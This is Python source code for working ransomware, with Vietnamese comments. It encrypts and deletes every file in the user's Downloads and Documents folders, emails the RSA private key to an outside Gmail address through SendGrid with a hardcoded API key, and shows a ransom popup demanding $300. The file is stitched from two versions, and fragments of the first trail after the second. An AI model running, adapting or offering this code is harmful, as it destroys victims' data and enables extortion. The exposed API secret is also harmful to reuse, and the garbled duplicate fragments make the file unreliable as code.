import os
import glob
import tkinter as tk
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail

# Bước 1: Mã hóa dữ liệu với AES
def encrypt_with_aes(data, aes_key, aes_iv):
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(aes_iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(data) + encryptor.finalize()

# Bước 2: Tạo cặp khóa RSA và mã hóa khóa AES với RSA
def encrypt_aes_key_with_rsa(aes_key, rsa_public_key):
    encrypted_key = rsa_public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted_key

# Mã hóa và thêm phần mở rộng ".aes"
def encrypt_files_in_directory(directory_path, aes_key, aes_iv):
    # Lấy tất cả các tệp trong thư mục
    files = glob.glob(os.path.join(directory_path, '*'))
    
    for file_path in files:
        if os.path.isfile(file_path):
            # Mở file và đọc nội dung
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            # Mã hóa dữ liệu file bằng AES
            encrypted_data = encrypt_with_aes(file_data, aes_key, aes_iv)
            
            # Lưu file với phần mở rộng .aes
            encrypted_file_path = file_path + '.aes'
            with open(encrypted_file_path, 'wb') as ef:
                ef.write(encrypted_data)
            
            # Xóa file gốc (không mã hóa)
            os.remove(file_path)
            print(f"Encrypted and removed: {file_path}")

# Bước 3: Gửi private key qua SendGrid
def send_private_key_via_email(private_key):
    # Chuyển đổi private key thành định dạng PEM
    pem_private_key = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )

    message = Mail(
        from_email='canopyfit@gmail.com',
        to_emails='canopycarepro@gmail.com',
        subject='Your RSA Private Key',
        plain_text_content=f'Here is your private key:\n\n{pem_private_key.decode("utf-8")}'
    )

    try:
        sg = SendGridAPIClient('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')
        response = sg.send(message)
        print(response.status_code)
        print(response.body)
        print(response.headers)
    except Exception as e:
        print(str(e))

# Hàm chính để mã hóa tệp và gửi private key qua email
def encrypt_and_notify():
    aes_key = os.urandom(32)  # AES-256 key
    aes_iv = os.urandom(16)   # AES IV

    # Tạo cặp khóa RSA
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()

    # Mã hóa khóa AES bằng RSA public key
    encrypted_aes_key = encrypt_aes_key_with_rsa(aes_key, public_key)

    # Mã hóa các tệp trong thư mục Downloads và Documents
    downloads_path = os.path.expanduser("~/Downloads")
    documents_path = os.path.expanduser("~/Documents")
    encrypt_files_in_directory(downloads_path, aes_key, aes_iv)
    encrypt_files_in_directory(documents_path, aes_key, aes_iv)

    # Gửi private key qua email
    send_private_key_via_email(private_key)

    print("Encryption completed and private key sent via email.")

    # Hiển thị popup
    ransom_popup()

# Popup thông báo tiền chuộc
def ransom_popup():
    window = tk.Tk()
    window.title("Ooops, your files have been encrypted!")
    window.geometry("700x600")  # Tăng kích thước cửa sổ để chứa tất cả nội dung
    window.configure(bg='#b30000')  # Màu nền đỏ tương tự

    # Tiêu đề
    label_title = tk.Label(window, text="Ooops, your files have been encrypted!",
                           font=("Helvetica", 20, "bold"), fg="white", bg='#b30000')
    label_title.pack(pady=10)

    # Khung nội dung chính
    content_frame = tk.Frame(window, bg='#ffffff', padx=10, pady=10)
    content_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

    # Mô tả tình trạng tệp bị mã hóa (tự động ngắt dòng với wraplength)
    label_desc = tk.Label(content_frame, text="Your important files are encrypted. Many of your documents, photos, "
                                              "videos, databases and other files are no longer accessible because they "
                                              "have been encrypted. Nobody can recover your files without our "
                                              "decryption service.", 
                          justify="left", wraplength=650, bg='#ffffff', fg='#000000', font=("Helvetica", 14))
    label_desc.pack(anchor="w", pady=10)

    # Thời gian đếm ngược
    frame_countdown = tk.Frame(content_frame, bg='#b30000')
    frame_countdown.pack(fill=tk.X, pady=10)

    label_payment_raised = tk.Label(frame_countdown, text="Payment will be raised on",
                                    font=("Helvetica", 14, "bold"), fg="yellow", bg='#b30000')
    label_payment_raised.grid(row=0, column=0, sticky="w", padx=5)

    label_time_left = tk.Label(frame_countdown, text="05/15/2017 05:03:41\nTime Left: 02:23:59:07",
                               font=("Helvetica", 14), fg="white", bg='#b30000')
    label_time_left.grid(row=1, column=0, sticky="w", padx=5)
import os
import glob
import tkinter as tk
from tkinter import simpledialog, messagebox, scrolledtext
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail
from datetime import datetime
import base64  # Để lưu trữ khóa AES dưới dạng chuỗi

# Mã hóa dữ liệu với AES
def encrypt_with_aes(data, aes_key, aes_iv):
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(aes_iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(data) + encryptor.finalize()

# Giải mã dữ liệu với AES
def decrypt_with_aes(encrypted_data, aes_key, aes_iv):
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(aes_iv), backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(encrypted_data) + decryptor.finalize()

# Mã hóa khóa AES với RSA public key
def encrypt_aes_key_with_rsa(aes_key, rsa_public_key):
    encrypted_key = rsa_public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted_key

# Giải mã khóa AES với RSA private key
def decrypt_aes_key_with_rsa(encrypted_aes_key, private_key):
    decrypted_key = private_key.decrypt(
        encrypted_aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return decrypted_key

# Mã hóa và thêm phần mở rộng ".aes"
def encrypt_files_in_directory(directory_path, aes_key, aes_iv):
    files = glob.glob(os.path.join(directory_path, '*'))
    
    for file_path in files:
        if os.path.isfile(file_path):
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            encrypted_data = encrypt_with_aes(file_data, aes_key, aes_iv)
            encrypted_file_path = file_path + '.aes'
            
            with open(encrypted_file_path, 'wb') as ef:
                ef.write(encrypted_data)
            
            os.remove(file_path)
            print(f"Encrypted and removed: {file_path}")

# Giải mã các tệp trong thư mục và bỏ đuôi ".aes"
def decrypt_files_in_directory(directory_path, aes_key, aes_iv):
    files = glob.glob(os.path.join(directory_path, '*.aes'))  # Chỉ giải mã các tệp đã bị mã hóa (.aes)
    
    for file_path in files:
        if os.path.isfile(file_path):
            with open(file_path, 'rb') as f:
                encrypted_data = f.read()

            decrypted_data = decrypt_with_aes(encrypted_data, aes_key, aes_iv)
            decrypted_file_path = file_path.replace('.aes', '')  # Bỏ phần mở rộng .aes

            with open(decrypted_file_path, 'wb') as df:
                df.write(decrypted_data)

            os.remove(file_path)  # Xóa tệp mã hóa
            print(f"Decrypted and removed: {file_path}")

# Gửi private key qua email
def send_private_key_via_email(private_key, encrypted_aes_key, aes_iv):
    pem_private_key = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )

    # Lưu khóa AES đã mã hóa và IV vào email
    encrypted_aes_key_b64 = base64.b64encode(encrypted_aes_key).decode('utf-8')
    aes_iv_b64 = base64.b64encode(aes_iv).decode('utf-8')

    message = Mail(
        from_email='canopyfit@gmail.com',
        to_emails='canopycarepro@gmail.com',
        subject='Your RSA Private Key',
        plain_text_content=f'Here is your private key:\n\n{pem_private_key.decode("utf-8")}\n\n'
                           f'Encrypted AES Key (Base64): {encrypted_aes_key_b64}\n'
                           f'AES IV (Base64): {aes_iv_b64}'
    )

    try:
        sg = SendGridAPIClient('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')
        response = sg.send(message)
        print(response.status_code)
        print(response.body)
        print(response.headers)
    except Exception as e:
        print(str(e))

# Khi nhấn nút "Decrypt", mở một cửa sổ để người dùng nhập private key và giải mã các tệp
def decrypt_files():
    window = tk.Toplevel()
    window.title("Enter your private key")
    window.geometry("600x400")
    window.configure(bg='#b30000')

    # Tiêu đề
    label = tk.Label(window, text="Please enter your private key (PEM format):", font=("Helvetica", 14), fg="white", bg='#b30000')
    label.pack(pady=10)

    # Khu vực nhập khóa
    text_area = scrolledtext.ScrolledText(window, width=70, height=10, font=("Helvetica", 12))
    text_area.pack(padx=20, pady=10)

    # Nút xác nhận
    def submit_key():
        private_key_pem = text_area.get("1.0", tk.END).strip()
        if not private_key_pem:
            messagebox.showerror("Error", "You must enter a valid private key!")
            return
        try:
            private_key = serialization.load_pem_private_key(
                private_key_pem.encode(),
                password=None,
                backend=default_backend()
            )

            # Thay thế bằng khóa AES đã được mã hóa và IV thực tế trong quá trình mã hóa
            # Lấy khóa AES và IV từ email hoặc nguồn lưu trữ
            encrypted_aes_key_b64 = simpledialog.askstring("Input", "Enter the encrypted AES key (Base64):")
            aes_iv_b64 = simpledialog.askstring("Input", "Enter the AES IV (Base64):")

            encrypted_aes_key = base64.b64decode(encrypted_aes_key_b64)
            aes_iv = base64.b64decode(aes_iv_b64)

            # Thực hiện giải mã AES key
            decrypted_aes_key = decrypt_aes_key_with_rsa(encrypted_aes_key, private_key)

            # In ra kích thước của AES key và IV để kiểm tra
            print(f"Decrypted AES Key: {decrypted_aes_key}, Length: {len(decrypted_aes_key)}")
            print(f"AES IV: {aes_iv}, Length: {len(aes_iv)}")

            downloads_path = os.path.expanduser("~/Downloads")
            documents_path = os.path.expanduser("~/Documents")
            
            decrypt_files_in_directory(downloads_path, decrypted_aes_key, aes_iv)
            decrypt_files_in_directory(documents_path, decrypted_aes_key, aes_iv)

            messagebox.showinfo("Success", "Files have been successfully decrypted!")
            window.destroy()
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to decrypt files: {str(e)}")

    btn_submit = tk.Button(window, text="Submit", font=("Helvetica", 14), bg="#ffcc00", fg="black", command=submit_key)
    btn_submit.pack(pady=20)

# Hàm chính để mã hóa tệp và gửi private key qua email
def encrypt_and_notify():
    aes_key = os.urandom(32)  # AES-256 key
    aes_iv = os.urandom(16)   # AES IV

    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()

    encrypted_aes_key = encrypt_aes_key_with_rsa(aes_key, public_key)

    downloads_path = os.path.expanduser("~/Downloads")
    documents_path = os.path.expanduser("~/Documents")
    encrypt_files_in_directory(downloads_path, aes_key, aes_iv)
    encrypt_files_in_directory(documents_path, aes_key, aes_iv)

    send_private_key_via_email(private_key, encrypted_aes_key, aes_iv)

    print("Encryption completed and private key sent via email.")

    ransom_popup()

# Lấy thời gian hiện tại
def get_current_time():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# Popup thông báo tiền chuộc
def ransom_popup():
    window = tk.Tk()
    window.title("Ooops, your files have been encrypted!")
    window.geometry("700x600")
    window.configure(bg='#b30000')

    label_title = tk.Label(window, text="Ooops, your files have been encrypted!",
                           font=("Helvetica", 20, "bold"), fg="white", bg='#b30000')
    label_title.pack(pady=10)

    content_frame = tk.Frame(window, bg='#ffffff', padx=10, pady=10)
    content_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

    label_desc = tk.Label(content_frame, text="Your important files are encrypted. Many of your documents, photos, "
                                              "videos, databases and other files are no longer accessible because they "
                                              "have been encrypted. Nobody can recover your files without our "
                                              "decryption service.", 
                          justify="left", wraplength=650, bg='#ffffff', fg='#000000', font=("Helvetica", 14))
    label_desc.pack(anchor="w", pady=10)

    frame_countdown = tk.Frame(content_frame, bg='#b30000')
    frame_countdown.pack(fill=tk.X, pady=10)

    label_payment_raised = tk.Label(frame_countdown, text="Payment will be raised on",
                                    font=("Helvetica", 14, "bold"), fg="yellow", bg='#b30000')
    label_payment_raised.grid(row=0, column=0, sticky="w", padx=5)

    label_time_left = tk.Label(frame_countdown, text=f"{get_current_time()}\nTime Left: 02:23:59:07",
                               font=("Helvetica", 14), fg="white", bg='#b30000')
    label_time_left.grid(row=1, column=0, sticky="w", padx=5)

    label_files_lost = tk.Label(frame_countdown, text="Your files will be lost on",
                                font=("Helvetica", 14, "bold"), fg="yellow", bg='#b30000')
    label_files_lost.grid(row=2, column=0, sticky="w", padx=5)

    label_time_lost = tk.Label(frame_countdown, text="2024-12-31 05:03:41\nTime Left: 06:23:59:07",
                               font=("Helvetica", 14), fg="white", bg='#b30000')
    label_time_lost.grid(row=3, column=0, sticky="w", padx=5)

    label_payment_info = tk.Label(content_frame, text="Send $300 to this account:\n"
                                                     "01234567891011\n\n"
                                                     "After I receive the payment, I will send a text file containing \n"
                                                     "the decryption key into the system.",
                                  font=("Helvetica", 14, "bold"),
                                  fg="black", bg="#ffcc00", padx=5, pady=5, wraplength=650)
    label_payment_info.pack(fill=tk.X, pady=20)

    button_frame = tk.Frame(window, bg='#b30000')
    button_frame.pack(fill=tk.X, pady=10)

    btn_decrypt = tk.Button(button_frame, text="Decrypt", font=("Helvetica", 14, "bold"),
                            bg="#ffcc00", fg="black", padx=20, command=decrypt_files)
    btn_decrypt.pack(padx=10)

    window.mainloop()

# Chạy hàm mã hóa và hiển thị popup
encrypt_and_notify()

    label_files_lost = tk.Label(frame_countdown, text="Your files will be lost on",
                                font=("Helvetica", 14, "bold"), fg="yellow", bg='#b30000')
    label_files_lost.grid(row=2, column=0, sticky="w", padx=5)

    label_time_lost = tk.Label(frame_countdown, text="05/19/2017 05:03:41\nTime Left: 06:23:59:07",
                               font=("Helvetica", 14), fg="white", bg='#b30000')
    label_time_lost.grid(row=3, column=0, sticky="w", padx=5)

    # Thông tin thanh toán
    label_payment_info = tk.Label(content_frame, text="Send $300 to this account:\n"
                                                     "01234567891011", font=("Helvetica", 14, "bold"),
                                  fg="black", bg="#ffcc00", padx=5, pady=5)
    label_payment_info.pack(fill=tk.X, pady=20)

    # Các nút chức năng
    button_frame = tk.Frame(window, bg='#b30000')
    button_frame.pack(fill=tk.X, pady=10)

    btn_check_payment = tk.Button(button_frame, text="Check Payment", font=("Helvetica", 14, "bold"),
                                  bg="#ffffff", fg="black", padx=20)
    btn_check_payment.pack(side=tk.LEFT, padx=10)

    btn_decrypt = tk.Button(button_frame, text="Decrypt", font=("Helvetica", 14, "bold"),
                            bg="#ffffff", fg="black", padx=20)
    btn_decrypt.pack(side=tk.RIGHT, padx=10)

    window.mainloop()

# Chạy hàm mã hóa và hiển thị popup
encrypt_and_notify()
